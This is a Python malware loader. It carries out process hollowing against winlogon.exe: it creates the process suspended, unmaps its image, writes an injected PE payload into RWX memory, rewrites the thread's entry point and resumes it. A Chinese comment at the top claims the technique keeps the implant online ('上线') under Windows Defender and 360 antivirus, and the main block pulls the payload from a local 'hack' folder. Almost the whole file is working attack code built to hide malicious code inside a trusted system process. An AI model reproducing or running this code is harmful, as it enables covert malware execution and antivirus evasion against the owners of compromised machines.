import json
import logging
import platform
import re
import sys
import subprocess
from ctypes import *
from ctypes.wintypes import *


info="测试进程镂空winlogon.exe可以稳定在denfender、360等杀软防护下稳定上线，虽然defender会告警提示发现病毒木马，但并不会强制结束winlogon.exe，因此可以稳定上线使用。"

CREATE_SUSPENDED = 0x00000004
CONTEXT_FULL = 0x10000B
WOW64_CONTEXT_FULL = 0x10007

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

DWORD64 = c_ulonglong

WOW64_MAXIMUM_SUPPORTED_EXTENSION = 512


class SECURITY_ATTRIBUTES(Structure):
    _fields_ = [
        ("nLength", DWORD),
        ("lpSecurityDescriptor", LPVOID),
        ("bInheritHandle", BOOL),
    ]


class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ("hProcess", HANDLE),
        ("hThread", HANDLE),
        ("dwProcessId", DWORD),
        ("dwThreadId", DWORD),
    ]


class STARTUPINFO(Structure):
    _fields_ = [
        ("cb", DWORD),
        ("lpReserved", LPWSTR),
        ("lpDesktop", LPWSTR),
        ("lpTitle", LPWSTR),
        ("dwX", DWORD),
        ("dwY", DWORD),
        ("dwXSize", DWORD),
        ("dwYSize", DWORD),
        ("dwXCountChars", DWORD),
        ("dwYCountChars", DWORD),
        ("dwFillAttribute", DWORD),
        ("dwFlags", DWORD),
        ("wShowWindow", WORD),
        ("cbReserved2", WORD),
        ("lpReserved2", POINTER(BYTE)),
        ("hStdInput", HANDLE),
        ("hStdOutput", HANDLE),
        ("hStdError", HANDLE),
    ]


class WOW64_FLOATING_SAVE_AREA(Structure):
    _fields_ = [
        ("ControlWord", DWORD),
        ("StatusWord", DWORD),
        ("TagWord", DWORD),
        ("ErrorOffset", DWORD),
        ("ErrorSelector", DWORD),
        ("DataOffset", DWORD),
        ("DataSelector", DWORD),
        ("RegisterArea", BYTE * 80),
        ("Cr0NpxState", DWORD),
    ]


class WOW64_CONTEXT(Structure):
    _fields_ = [
        ("ContextFlags", DWORD),
        ("Dr0", DWORD),
        ("Dr1", DWORD),
        ("Dr2", DWORD),
        ("Dr3", DWORD),
        ("Dr6", DWORD),
        ("Dr7", DWORD),
        ("FloatSave", WOW64_FLOATING_SAVE_AREA),
        ("SegGs", DWORD),
        ("SegFs", DWORD),
        ("SegEs", DWORD),
        ("SegDs", DWORD),
        ("Edi", DWORD),
        ("Esi", DWORD),
        ("Ebx", DWORD),
        ("Edx", DWORD),
        ("Ecx", DWORD),
        ("Eax", DWORD),
        ("Ebp", DWORD),
        ("Eip", DWORD),
        ("SegCs", DWORD),
        ("EFlags", DWORD),
        ("Esp", DWORD),
        ("SegSs", DWORD),
        ("ExtendedRegisters", BYTE * WOW64_MAXIMUM_SUPPORTED_EXTENSION),
    ]


class M128A(Structure):
    _fields_ = [("Low", DWORD64), ("High", DWORD64)]


class XMM_SAVE_AREA32(Structure):
    _pack_ = 1
    _fields_ = [
        ("ControlWord", WORD),
        ("StatusWord", WORD),
        ("TagWord", BYTE),
        ("Reserved1", BYTE),
        ("ErrorOpcode", WORD),
        ("ErrorOffset", DWORD),
        ("ErrorSelector", WORD),
        ("Reserved2", WORD),
        ("DataOffset", DWORD),
        ("DataSelector", WORD),
        ("Reserved3", WORD),
        ("MxCsr", DWORD),
        ("MxCsr_Mask", DWORD),
        ("FloatRegisters", M128A * 8),
        ("XmmRegisters", M128A * 16),
        ("Reserved4", BYTE * 96),
    ]


class DUMMYSTRUCTNAME(Structure):
    _fields_ = [
        ("Header", M128A * 2),
        ("Legacy", M128A * 8),
        ("Xmm0", M128A),
        ("Xmm1", M128A),
        ("Xmm2", M128A),
        ("Xmm3", M128A),
        ("Xmm4", M128A),
        ("Xmm5", M128A),
        ("Xmm6", M128A),
        ("Xmm7", M128A),
        ("Xmm8", M128A),
        ("Xmm9", M128A),
        ("Xmm10", M128A),
        ("Xmm11", M128A),
        ("Xmm12", M128A),
        ("Xmm13", M128A),
        ("Xmm14", M128A),
        ("Xmm15", M128A),
    ]


class DUMMYUNIONNAME(Union):
    _fields_ = [("FltSave", XMM_SAVE_AREA32), ("DummyStruct", DUMMYSTRUCTNAME)]


class CONTEXT64(Structure):
    _pack_ = 16
    _fields_ = [
        ("P1Home", DWORD64),
        ("P2Home", DWORD64),
        ("P3Home", DWORD64),
        ("P4Home", DWORD64),
        ("P5Home", DWORD64),
        ("P6Home", DWORD64),
        ("ContextFlags", DWORD),
        ("MxCsr", DWORD),
        ("SegCs", WORD),
        ("SegDs", WORD),
        ("SegEs", WORD),
        ("SegFs", WORD),
        ("SegGs", WORD),
        ("SegSs", WORD),
        ("EFlags", DWORD),
        ("Dr0", DWORD64),
        ("Dr1", DWORD64),
        ("Dr2", DWORD64),
        ("Dr3", DWORD64),
        ("Dr6", DWORD64),
        ("Dr7", DWORD64),
        ("Rax", DWORD64),
        ("Rcx", DWORD64),
        ("Rdx", DWORD64),
        ("Rbx", DWORD64),
        ("Rsp", DWORD64),
        ("Rbp", DWORD64),
        ("Rsi", DWORD64),
        ("Rdi", DWORD64),
        ("R8", DWORD64),
        ("R9", DWORD64),
        ("R10", DWORD64),
        ("R11", DWORD64),
        ("R12", DWORD64),
        ("R13", DWORD64),
        ("R14", DWORD64),
        ("R15", DWORD64),
        ("Rip", DWORD64),
        ("DebugControl", DWORD64),
        ("LastBranchToRip", DWORD64),
        ("LastBranchFromRip", DWORD64),
        ("LastExceptionToRip", DWORD64),
        ("LastExceptionFromRip", DWORD64),
        ("DUMMYUNIONNAME", DUMMYUNIONNAME),
        ("VectorRegister", M128A * 26),
        ("VectorControl", DWORD64),
    ]




def main(dic=dict()):
    print(type(dic))
    print(type(json.loads(dic)))
    if not isinstance(dic,dict):
        dic=json.loads(dic)
    TARGET_EXE = dic.get('TARGET_EXE')
    if not TARGET_EXE:
        TARGET_EXE='winlogon.exe'
    USING_64_BIT = platform.architecture()[0] == '64bit'
    # PE_TYPE,ImageBase,SizeOfImage,SizeOfHeaders,AddressOfEntryPoint,get_field_absolute_offset,payload_data,sections=getPayload()
    PE_TYPE=dic.get('PE_TYPE')
    ImageBase=dic.get('ImageBase')
    SizeOfImage=dic.get('SizeOfImage')
    SizeOfHeaders=dic.get('SizeOfHeaders')
    AddressOfEntryPoint=dic.get('AddressOfEntryPoint')
    get_field_absolute_offset=dic.get('get_field_absolute_offset')
    payload_data=dic.get('payload_data').encode('latin1')
    sections=dic.get('sections')
    # ImageBase=dic['ImageBase']
    # ImageBase=dic['ImageBase']

    logger = logging.getLogger(__name__)
    logging.basicConfig(
        format="[%(asctime)s] %(levelname)s: %(message)s",
        level=logging.DEBUG,
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    startup_info = STARTUPINFO()
    startup_info.cb = sizeof(startup_info)
    process_info = PROCESS_INFORMATION()


    if windll.kernel32.CreateProcessA(
            None,
            create_string_buffer(bytes(TARGET_EXE, encoding="ascii")),
            None,
            None,
            False,
            CREATE_SUSPENDED,               #dwCreationFlags：0x00000004的值，代表新进程的主线程处于挂起状态创建，在调用 ResumeThread 函数之前不会运行。
            None,
            None,
            byref(startup_info),
            byref(process_info),
    ) == 0:
        logger.error(f"挂起{TARGET_EXE}失败: {FormatError(GetLastError())}")
        sys.exit(1)
    logger.debug(f"挂起{TARGET_EXE}成功，进程ID: {process_info.dwProcessId}")


    context = CONTEXT64() if USING_64_BIT else WOW64_CONTEXT()
    context.ContextFlags = CONTEXT_FULL if USING_64_BIT else WOW64_CONTEXT_FULL
    if windll.kernel32.GetThreadContext(process_info.hThread, byref(context)) == 0:
        logger.error(f"获取目标线程上下文失败: {FormatError(GetLastError())}")
        sys.exit(1)

    logger.info(f"获取目标线程上下文成功")
    target_image_base = LPVOID()
    if windll.kernel32.ReadProcessMemory(
            process_info.hProcess,
            LPVOID((context.Rdx if USING_64_BIT else context.Ebx) + 2 * sizeof(c_size_t)),
            byref(target_image_base),
            sizeof(LPVOID),
            None
    ) == 0:
        logger.error(f"获取目标基地址失败: {FormatError(GetLastError())}")
        sys.exit(1)
    logger.debug(f"获取目标进程基地址成功: {hex(target_image_base.value)}")

    if target_image_base == ImageBase:
        logger.info("Unmapping target executable from the process ")
        if windll.ntdll.NtUnmapViewOfSection(process_info.hProcess, target_image_base) == 0:
            logger.error(f"Error in NtUnmapViewOfSection: {FormatError(GetLastError())}")
            sys.exit(1)


    if USING_64_BIT:
        windll.kernel32.VirtualAllocEx.restype = LPVOID
    allocated_address = windll.kernel32.VirtualAllocEx(
        process_info.hProcess,
        LPVOID(ImageBase),
        SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
        )
    if allocated_address == 0:
        logger.error(f"VirtualAllocEx申请内存失败: {FormatError(GetLastError())}")
        sys.exit(1)
    logger.debug(f"VirtualAllocEx申请内存成功：{hex(allocated_address)}")


    if windll.kernel32.WriteProcessMemory(
            process_info.hProcess,
            LPVOID(allocated_address),
            payload_data,
            SizeOfHeaders,
            None,
    ) == 0:
        logger.error(f"向{hex(allocated_address)}中写入payload失败: {FormatError(GetLastError())}")
        sys.exit(1)
    logger.info(f"将payload写入刚申请的地址：{hex(allocated_address)}")


    for section in sections:
        section_name = section['sectionName']
        logger.info(f"将payload的section {section_name} 写入 {hex(allocated_address + section['sectionVirtualAddress'])}（目标进程中申请的基地址+payload section的偏移）")
        if windll.kernel32.WriteProcessMemory(
                process_info.hProcess,
                LPVOID(allocated_address + section['sectionVirtualAddress']),
                payload_data[section['sectionPointerToRawData']:],
                section['sectionSizeOfRawData'],
                None,
        ) == 0:
            logger.error(f"修改Section失败: {FormatError(GetLastError())}")
            sys.exit(1)

    logger.info("修改Section成功")

    if USING_64_BIT:
        context.Rcx = allocated_address + AddressOfEntryPoint
        logger.debug(f"新的entrypoint: {hex(context.Rcx)}（目标进程中申请的基地址+payload的entrypoint）")
    else:
        context.Eax = allocated_address + AddressOfEntryPoint
        logger.debug(f"New entrypoint: {hex(context.Eax)}（目标进程中申请的基地址+payload的entrypoint）")


    if windll.kernel32.WriteProcessMemory(
            process_info.hProcess,
            LPVOID((context.Rdx if USING_64_BIT else context.Ebx) + 2 * sizeof(c_size_t)),
            payload_data[get_field_absolute_offset:],
            sizeof(LPVOID),
            None,
    ) == 0:
        logger.error(f"修改entrypoint失败: {FormatError(GetLastError())}")
        sys.exit(1)
    logger.info("修改entrypoint成功")


    if windll.kernel32.SetThreadContext(process_info.hThread, byref(context)) == 0:
        logger.error(f"修改目标线程上下文失败: {FormatError(GetLastError())}")
        sys.exit(1)
    logger.info("修改目标线程上下文成功")



    while True:
        #让挂起的进程
        value=windll.kernel32.ResumeThread(process_info.hThread)
        if  value== 0:
            logger.error(f"恢复挂起进程: {FormatError(GetLastError())}")
            break


    # import time
    # time.sleep(20)

def findExE():
    cmd=f"tasklist"
    out=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
    infos=out.stdout.read().splitlines()
    exelist=[]      #去重
    if len(infos) >=1:
        for i in infos:
            if not i:
                continue
            i=i.decode('gbk')
            exename=i.split()[0]
            if not re.search(r'.exe',exename):
                continue
            if exename not in exelist:
                exelist.append(exename)
        return exelist
    else:
        return -1

if __name__ == '__main__':
    import shellcoder
    buf=shellcoder.main('','',r"C:\Users\d\Desktop\hack\payloadJQuery.py",'','',True)
    print('buf:\n',buf)
    main(buf)
